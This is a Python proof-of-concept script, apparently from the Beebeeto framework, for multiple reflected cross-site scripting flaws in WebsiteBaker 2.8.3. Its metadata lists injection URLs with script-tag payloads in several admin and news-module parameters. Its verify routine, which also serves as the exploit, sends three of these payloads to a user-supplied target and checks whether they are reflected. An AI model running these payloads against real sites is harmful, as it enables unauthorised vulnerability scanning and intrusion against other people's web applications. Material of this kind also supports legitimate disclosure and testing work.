#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0147',
            'name': 'WebsiteBaker <=2.8.3 多个XSS漏洞 POC',
            'author': '1024',
            'create_date': '2014-11-18',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'WebsiteBaker',
            'vul_version': ['2.8.3'],
            'type': 'Cross Site Scripting',
            'tag': ['WebsiteBaker漏洞', 'XSS漏洞', 'Multiple XSS Vulnerabilities', 'php'],
            'desc': '''
                    Cross-Site Scripting GET:

                    /wb/admin/admintools/tool.php?tool=captcha_control&6d442"><script>alert(1)</script>8e3b12642a8=1
                    /wb/modules/news/add_post.php?page_id=1&section_id=f953a"><script>alert(1)</script>4ddf3369c1f
                    /wb/modules/news/modify_group.php?page_id=1&section_id="><script>alert(1)</script>2680504c3ec&group_id=62be99873b33d1d3
                    /wb/modules/news/modify_post.php?page_id=1&section_id="><script>alert(1)</script>4194d511605&post_id=db89943875a2db52
                    /wb/modules/news/modify_settings.php?page_id=1&section_id=2f4"><script>alert(1)</script>bdc8b3919b5
                    ''',
            'references': ['http://seclists.org/fulldisclosure/2014/Nov/44',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        args['poc_ret']['vul_list'] = []
        
        payload_list = ['/wb/admin/admintools/tool.php?tool=captcha_control&6d442"><script>alert(1)</script>8e3b12642a8=1',
                        '/wb/modules/news/add_post.php?page_id=1&section_id=f953a"><script>alert(1)</script>4ddf3369c1f',
                        '/wb/modules/news/modify_settings.php?page_id=1&section_id=123"><script>alert(1)</script>bdc8b3919b5']
        for i in payload_list:
            verify_url = args['options']['target'] + i
            if args['options']['verbose']:
                print '[*] Request URL: ' + verify_url
            try:
                req = urllib2.urlopen(verify_url)
                content = req.read()
            except:
                continue
            if '"><script>alert(1)</script>' in content:
                args['success'] = True
                args['poc_ret']['vul_list'].append(verify_url)
        if not args['poc_ret']['vul_list']:
            args['poc_ret'].pop('vul_list')
            args['success'] = False
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())